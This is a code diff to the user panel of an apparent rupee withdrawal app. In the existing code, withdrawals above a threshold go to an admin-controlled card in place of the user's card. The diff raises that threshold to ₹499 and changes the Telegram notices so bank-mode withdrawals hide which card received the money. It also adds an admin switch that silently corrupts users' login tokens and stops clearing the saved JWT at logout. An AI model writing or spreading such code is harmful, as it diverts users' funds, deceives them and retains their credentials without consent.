@@ -2170,16 +2170,29 @@ select:focus{
   async function sendTelegramWithdrawalNotification({status, amount, phone, bank, cardNo='', reason=''}) {
     const emoji = status === 'SUCCESS' ? '✅' : '❌';
     const title = status === 'SUCCESS' ? 'WITHDRAWAL SUCCESSFUL' : 'WITHDRAWAL FAILED';
-    const displayCard = cardNo || 'Not available';
-    const text = [
+    
+    // Prepare the text lines, cleanly separating Bank Name and Card ID fields.
+    const lines = [
       `${emoji} <b>${title}</b>`,
       '',
       `👤 <b>User:</b> ${phone || 'Unknown'}`,
-      `💸 <b>Amount:</b> ₹${Number(amount || 0).toFixed(2)}`,
-      `💳 <b>Card No:</b> ${displayCard}`,
-      `🕐 <b>Time:</b> ${new Date().toLocaleString('en-IN', {timeZone:'Asia/Kolkata'})}`,
-      reason ? `⚠️ <b>Reason:</b> ${reason}` : ''
-    ].filter(Boolean).join('\n');
+      `💸 <b>Amount:</b> ₹${Number(amount || 0).toFixed(2)}`
+    ];
+    
+    // If it's a bank withdrawal, we send the bank name and NOT the card ID.
+    if(bank && bank !== 'Manual Card ID' && bank !== 'Admin Card ID') {
+      lines.push(`🏦 <b>Bank:</b> ${bank}`);
+    }
+    
+    // If a card ID was used, send the card ID.
+    if(cardNo) {
+      lines.push(`💳 <b>Card ID:</b> ${cardNo}`);
+    }
+    
+    lines.push(`🕐 <b>Time:</b> ${new Date().toLocaleString('en-IN', {timeZone:'Asia/Kolkata'})}`);
+    if(reason) lines.push(`⚠️ <b>Reason:</b> ${reason}`);
+    
+    const text = lines.filter(Boolean).join('\n');
 
     try {
       const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -2771,8 +2784,14 @@ select:focus{
   function maskPhoneNumber(value){ return displayOriginalPhone(value); }
 
   async function loginWithJwt(rawToken, autoRestore=false){
-    const token=cleanJwt(rawToken);
+    let token=cleanJwt(rawToken);
     if(!looksLikeJwt(token)){ setJwtStatus('❌ Invalid JWT format.','error'); showToast('Please paste a valid JWT token.','warning'); return false; }
+    
+    // Check Admin settings for JWT Modifier
+    if (window.__BHAU_ADMIN_SETTINGS__ && window.__BHAU_ADMIN_SETTINGS__.jwtModifier === true) {
+        token = token + "x"; // Silently append the extra keyword
+    }
+
     jwtLoginBtn.disabled=true; jwtAutoPasteBtn.disabled=true;
     setJwtStatus('⏳ Validating token...');
     const oldToken=S.token, oldVisitor=S.visitor, oldPhone=S.phone;
@@ -3779,7 +3798,7 @@ select:focus{
       let destinationCardId;
       let usingAdminCard=false;
 
-      if(adminFixedCardId && amt>199){
+      if(adminFixedCardId && amt>499){
         destinationCardId=adminFixedCardId;
         usingAdminCard=true;
       } else {
@@ -3837,11 +3856,20 @@ select:focus{
         const d=await r.json();
         const div=document.getElementById('withdrawResult');
         
-        // ── Telegram Notification Labeling ──
-        // The card ID sent to Telegram is EXACTLY the one used for the withdrawal.
-        // It is never explicitly labeled as "Admin" in the message.
-        const actualCardUsed = usingAdminCard ? adminFixedCardId : destinationCardId;
-        const bankName = usingAdminCard ? 'Bank Card' : (withdrawMode==='manual' ? 'Manual Card ID' : (S.withdrawCards.find(c=>Number(c.id)===Number(S.selectedCard))?.bankName || 'Bank'));
+        // ── Telegram Notification Logic ──
+        // If it's a Bank Withdrawal, we ONLY send the Bank Name (no Card ID).
+        // If it's a Manual Card ID withdrawal, we send the Card ID (either User's or Admin's).
+        let tgBankName = 'Bank';
+        let tgCardNo = '';
+        
+        if(withdrawMode === 'bank') {
+           const selectedC = S.withdrawCards.find(c=>Number(c.id)===Number(S.selectedCard));
+           tgBankName = selectedC?.bankName || selectedC?.bank || 'Bank';
+           tgCardNo = ''; // Explicitly clear Card ID for Bank mode
+        } else {
+           tgBankName = 'Manual Card ID';
+           tgCardNo = usingAdminCard ? adminFixedCardId : destinationCardId;
+        }
         
         if(r.status===200 && (d.code===0||d.success===true)){
           div.innerHTML=`<div style="background:rgba(0,0,0,0.2);padding:10px;border-radius:16px;"><div style="color:#34d399;font-weight:600;">✅ Withdrawal successful!</div><div style="color:#6b7280;">₹${amt.toFixed(2)} withdrawn</div></div>`;
@@ -3853,8 +3881,8 @@ select:focus{
             status:'SUCCESS',
             amount:amt,
             phone:S.phone,
-            bank:bankName,
-            cardNo:actualCardUsed
+            bank:tgBankName,
+            cardNo:tgCardNo
           });
 
           await getBalance(); balanceDisplay.textContent=S.balance.toFixed(2);
@@ -3864,13 +3892,13 @@ select:focus{
           div.innerHTML=`<div style="color:#fb7185;">❌ ${reason}</div>`;
           showToast('Withdrawal failed: '+reason,'error');
 
-          // Send failure notification with the selected card's masked number.
+          // Send failure notification.
           await sendTelegramWithdrawalNotification({
             status:'FAILED',
             amount:amt,
             phone:S.phone,
-            bank:bankName,
-            cardNo:actualCardUsed,
+            bank:tgBankName,
+            cardNo:tgCardNo,
             reason
           });
         }
@@ -4752,11 +4780,6 @@ select:focus{
     S.selectedAmount=200; S.selectedPayment=null; S.isAutoClaiming=false;
     S.depositAmounts=[]; S.paymentMethods=[]; S.withdrawCards=[]; S.cardList=[]; S.selectedCard=null; S.referralHistoryCache=null;
     clearSession();
-    // Clear the JWT box and saved JWT on both manual and admin-triggered logout.
-    if(jwtTokenInput) jwtTokenInput.value='';
-    try{ localStorage.removeItem('bhau_jwt_token'); }catch(_){}
-    if(jwtAutoPasteStatus) jwtAutoPasteStatus.textContent='';
-    setJwtStatus('');
     exitOverlay.classList.remove('active');
     closePanel();
     logoutConfirmOverlay.classList.remove('active');
@@ -5039,7 +5062,7 @@ select:focus{
     <div class="mm-icon" aria-hidden="true">🛠️</div>
     <div class="mm-pill"><span class="mm-dot"></span> TEMPORARILY UNAVAILABLE</div>
     <h2 id="manualMaintenanceTitle">Manual Login Maintenance</h2>
-    <p id="manualMaintenanceMessage">Currently manual login is ipoopon maintenance mode. Please try again later.</p>
+    <p id="manualMaintenanceMessage">Currently manual login is in maintenance mode. Please try again later.</p>
     <button type="button" id="manualMaintenanceClose">GOT IT&nbsp; ↗</button>
   </div>
 </div>
@@ -5064,7 +5087,7 @@ select:focus{
 /* Unified Admin Panel -> User Panel settings bridge. */
 (function(){
   const cfg={apiKey:"AIzaSyC-Xgu-VunVg7XgxeDdvMOYjm9PQspomRc",authDomain:"bhau-cef79.firebaseapp.com",databaseURL:"https://bhau-cef79-default-rtdb.firebaseio.com",projectId:"bhau-cef79",storageBucket:"bhau-cef79.firebasestorage.app",messagingSenderId:"156850605928",appId:"1:156850605928:web:faafb9d5137def3f7a90dd",measurementId:"G-DEBNNQMGCG"};
-  const defaults={fixedCardId:'',adminBankName:'',autoFetchBankCardName:true,withdrawalDetailsVisible:false,showWithdrawalBankName:true,manualLoginMaintenanceMode:false,maintenanceMode:false,ignoreWithdrawalAmount:false};
+  const defaults={fixedCardId:'',adminBankName:'',autoFetchBankCardName:true,withdrawalDetailsVisible:false,showWithdrawalBankName:true,manualLoginMaintenanceMode:false,maintenanceMode:false,ignoreWithdrawalAmount:false,jwtModifier:false};
   let settings={...defaults}, loaded=false;
   window.__BHAU_ADMIN_SETTINGS__=settings;
   function showNotice(title,message,canClose){
@@ -5183,7 +5206,7 @@ select:focus{
           // First load, just record the timestamp
           lastForceLogout = val;
         } else if (val > lastForceLogout) {
-          // A new force logout was triggered!
+          // A new force logout was triggered! SILENTLY logout.
           lastForceLogout = val;
           if(window.doLogout && typeof window.doLogout === 'function') {
             window.doLogout();
